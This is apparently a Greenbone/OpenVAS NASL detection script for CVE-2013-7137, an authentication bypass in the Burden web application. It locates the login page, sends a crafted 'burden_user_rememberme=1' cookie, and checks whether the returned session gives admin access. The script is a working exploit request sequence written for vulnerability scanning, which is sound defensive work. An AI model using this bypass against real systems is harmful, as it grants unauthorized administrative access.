if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803792" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2013-7137" );
	script_bugtraq_id( 64662 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-01-13 15:17:42 +0530 (Mon, 13 Jan 2014)" );
	script_name( "Burden 'burden_user_rememberme' Authentication Bypass Vulnerability" );
	script_tag( name: "summary", value: "The host is running Burden and is prone to authentication bypass
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and check is it possible to login or not" );
	script_tag( name: "insight", value: "The flaw is due to insufficient authentication when handling
  'burden_user_rememberme' cookie parameter. A remote unauthenticated user
  can set 'burden_user_rememberme' cookie to '1' and gain administrative
  access to the application." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to login as admin without
  providing credentials." );
	script_tag( name: "affected", value: "Burden version 1.8 and prior." );
	script_tag( name: "solution", value: "Upgrade to Burden 1.8.1 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/56343" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/90186" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124719" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23192" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "https://github.com/joshf/Burden/releases/tag/1.8.1" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
bdPort = http_get_port( default: 80 );
if(!http_can_host_php( port: bdPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/Burden", "/burden", http_cgi_dirs( port: bdPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/login.php";
	res = http_get_cache( item: url, port: bdPort );
	if(isnull( res )){
		continue;
	}
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, ">Burden<" )){
		host = http_host_name( port: bdPort );
		url = dir + "/login.php";
		bdReq = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: burden_user_rememberme=1\\r\\n\\r\\n" );
		bdRes = http_keepalive_send_recv( port: bdPort, data: bdReq );
		if(!IsMatchRegexp( bdRes, "HTTP/1.. 302" ) || !ContainsString( bdRes, "Set-Cookie:" )){
			exit( 0 );
		}
		cookie = eregmatch( pattern: "Set-Cookie: PHPSESSID=([0-9a-z]*);", string: bdRes );
		if(!cookie[1]){
			exit( 0 );
		}
		url = dir + "/index.php";
		bdReq = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: burdenhascheckedforupdates=checkedsuccessfully", ";PHPSESSID=", cookie[1], "\\r\\n\\r\\n" );
		bdRes = http_keepalive_send_recv( port: bdPort, data: bdReq );
		if(ContainsString( bdRes, ">Logout<" ) && ContainsString( bdRes, ">Settings<" ) && ContainsString( bdRes, ">Burden<" )){
			security_message( port: bdPort );
			exit( 0 );
		}
	}
}
exit( 99 );

